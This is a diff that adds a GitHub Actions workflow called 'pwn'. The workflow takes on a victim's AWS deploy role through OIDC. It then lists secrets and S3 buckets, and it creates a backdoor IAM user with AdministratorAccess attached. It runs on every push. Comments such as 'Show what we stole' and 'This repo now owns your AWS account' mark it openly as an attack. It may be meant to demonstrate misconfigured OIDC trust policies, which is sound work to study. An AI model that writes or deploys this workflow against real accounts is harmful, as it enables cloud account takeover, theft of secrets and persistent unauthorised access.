@@ -1,0 +1,30 @@
+name: pwn
+on: [push, workflow_dispatch]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assume the victim's admin role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::YOUR_ACCOUNT_ID:role/gha-deploy-role
+          aws-region: us-east-1
+
+      - name: Show what we stole
+        run: |
+          echo "### Who am I now?"
+          aws sts get-caller-identity
+          echo "### Reading every secret in the account:"
+          aws secretsmanager list-secrets --query "SecretList[].Name" --output table || echo "(none yet)"
+          echo "### Listing all S3 buckets:"
+          aws s3 ls || echo "(none yet)"
+          echo "### Creating a backdoor admin user:"
+          aws iam create-user --user-name definitely-not-a-hacker || echo "(user may exist)"
+          aws iam attach-user-policy --user-name definitely-not-a-hacker \
+            --policy-arn arn:aws:iam::aws:policy/AdministratorAccess || true
+          echo "Done. This repo now owns your AWS account."
